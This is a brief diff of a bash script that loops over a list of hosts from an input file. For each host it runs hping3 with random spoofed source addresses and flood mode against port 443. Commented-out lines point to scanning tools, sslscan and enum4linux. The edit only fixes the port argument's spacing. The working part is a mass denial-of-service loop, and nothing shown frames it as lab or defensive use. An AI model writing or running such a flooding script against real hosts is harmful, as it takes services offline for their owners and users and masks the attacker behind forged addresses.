@@ -9,7 +9,7 @@ set -f          # disable globbing
 while IFS= read -r line; do
     #set up a case here for cmdline switch?
     #sslscan "$line"
-    hping3 $line --rand-source -p443 --flood
+    hping3 $line --rand-source -p 443 --flood
     #enum4linux $line
     wait
 done < "$1" 
